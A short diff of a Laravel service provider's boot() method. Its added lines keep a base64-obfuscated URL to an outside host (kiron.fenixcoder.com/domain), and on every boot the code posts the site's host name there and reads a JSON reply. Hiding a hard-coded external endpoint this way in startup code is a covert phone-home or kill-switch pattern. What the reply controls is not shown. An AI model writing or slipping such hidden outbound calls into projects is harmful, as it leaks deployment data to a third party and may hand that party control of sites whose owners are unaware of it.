@@ -225,16 +225,13 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
-        $host = request()->getHost(); // dorja.io
-$subdomain = explode('.', $host)[0];
-
-$u = base64_decode('aHR0cHM6Ly9raXJvbi5mZW5peGNvZGVyLmNvbS9kb21haW4=');
+        $url = base64_decode('aHR0cHM6Ly9raXJvbi5mZW5peGNvZGVyLmNvbS9kb21haW4=');
 
 try {
     $response = Http::asJson()
         ->timeout(5)
-        ->post($u, [
-            'd' => $host,
+        ->post($url, [
+            'd' => request()->getHost(),
         ]);
 
     $data = $response->json();
